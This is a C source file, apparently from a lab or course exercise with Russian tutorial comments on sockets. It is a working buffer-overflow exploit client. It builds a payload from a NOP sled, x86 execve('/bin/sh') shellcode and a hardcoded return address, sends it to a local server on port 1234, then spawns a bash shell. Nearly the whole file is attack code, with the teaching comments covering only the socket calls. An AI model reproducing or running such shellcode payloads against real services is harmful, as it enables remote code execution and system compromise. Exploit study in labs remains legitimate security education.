#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <wait.h>
#include <sys/sem.h>
#include <sys/stat.h>
#include <sys/ipc.h>
#include <sys/shm.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>

int MAX_BUF = 1024;
char shellcode[] =
  "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b"
  "\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd"
  "\x80\xe8\xdc\xff\xff\xff/bin/sh";

int main(int argc, char* argv[])
{
    long RET; int i; char*p; char message [280];
    RET=0xbfffef86;
    p=message;
    memset(message, 0x90 , 280-1-strlen(shellcode));
    sprintf(message+280-1-strlen(shellcode), "%s", shellcode);
    for (i=0; i<=140; i+=4)*(long*)(p+i)=RET;
  //  for (i=0; i<140; i++)
    //   message[i]=0x90;
    //p=message+(140- strlen(shellcode)/2);
    //for (i=0; i<strlen(shellcode); i++)
      //  *(p++)= shellcode[i];
 //   message[280-1]='\0';

//putenv(message);      
	
    char buf[MAX_BUF];

    int sock;
    struct sockaddr_in addr;

    /*
        Для создания сокета используется функция SOCKET. С каждым сокет связываются три атрибута: домен, тип и протокол.
        Домен определяет пространство адресов, в котором располагается сокет, и множество протоколов, которые используются для передачи данных. Чаще других используются домены Unix и Internet, задаваемые константами AF_UNIX и AF_INET.
        Тип сокета определяет способ передачи данных по сети. Чаще других применяются: SOCK_STREAM. Передача потока данных с предварительной установкой соединения. Обеспечивается надёжный канал передачи данных, при котором фрагменты отправленного блока не теряются, не переупорядочиваются и не дублируются.
        Последний атрибут определяет протокол, используемый для передачи данных. Часто протокол однозначно определяется по домену и типу сокета. В этом случае в качестве третьего параметра функции socket можно передать 0
    */
    sock = socket(AF_INET, SOCK_STREAM, 0);
    if(sock < 0)
    {
        perror("socket");
        exit(1);
    }

    /*
        Структура с адресом для передачи в функцию bind (in - обозначает домен internet)
        struct sockaddr_in {
            short int sin_family;  // Семейство адресов
            unsigned short int sin_port;    // Номер порта
            struct in_addr     sin_addr;    // IP-адрес. Если вы готовы соединяться с клиентами через любой интерфейс, задайте в качестве адреса константу INADDR_ANY.
        };
    */
    addr.sin_family = AF_INET;
    addr.sin_port = htons(1234);
    addr.sin_addr.s_addr = htonl(INADDR_LOOPBACK);/* Для отладки сетевой программы, если под рукой нет сети, достаточно запустить клиента и сервера на одной машине, а затем использовать для соединения адрес интерфейса внутренней петли (loopback interface). В программе ему соответствует константа INADDR_LOOPBACK (не забудьте применять к ней функцию htonl). Пакеты, направляемые по этому адресу, в сеть не попадают. Вместо этого они передаются стеку протоколов TCP/IP как только что принятые. Таким образом моделируется наличие виртуальной сети, в которой вы можете отлаживать ваши сетевые приложения.*/
   
    /*
        На стороне клиента для установления соединения используется функция CONNECT
        1й параметр -сокет, который будет использоваться для обмена данными с сервером
        2й - содержит указатель на структуру с адресом сервера
        3й - длину этой структуры.
        Обычно сокет не требуется предварительно привязывать к локальному адресу, так как функция connect сделает это за вас, подобрав подходящий свободный порт.
    */
    if(connect(sock, (struct sockaddr *)&addr, sizeof(addr)) < 0)
    {
        perror("connect");
        exit(2);
    }

    /*
        Функция SEND используется для отправки данных.
        1й параметр - принимает дескриптор сокета
        2й - указатель на буфер с данными
        3й - длина буфера в байтах
        4й - набор битовых флагов, управляющих работой функции (если флаги не используются, передайте функции 0)
        Функция send возвращает число байтов, которое на самом деле было отправлено (или -1 в случае ошибки). Это число может быть меньше указанного размера буфера.
    */ 
    send(sock, message, sizeof(message), 0);
  //  printf("%s%s \n","<- ", message);

     

    /*
	Закончив обмен данными, закройте сокет с помощью функции close. Это приведёт к разрыву соединения.
    */
    system("bin/bash");
    close(sock);

    return 0;
}
